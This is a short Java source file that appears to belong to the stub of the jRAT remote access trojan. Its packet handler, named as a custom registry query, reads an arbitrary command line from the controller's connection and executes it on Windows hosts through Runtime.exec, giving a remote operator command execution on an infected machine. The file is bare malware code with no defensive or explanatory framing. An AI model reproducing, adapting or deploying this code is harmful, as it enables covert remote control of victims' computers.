package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;

import com.redpois0n.oslib.OperatingSystem;

public class Packet80CustomRegQuery extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String cmd = con.readLine();
		
		try {
			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
				Runtime.getRuntime().exec(cmd);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
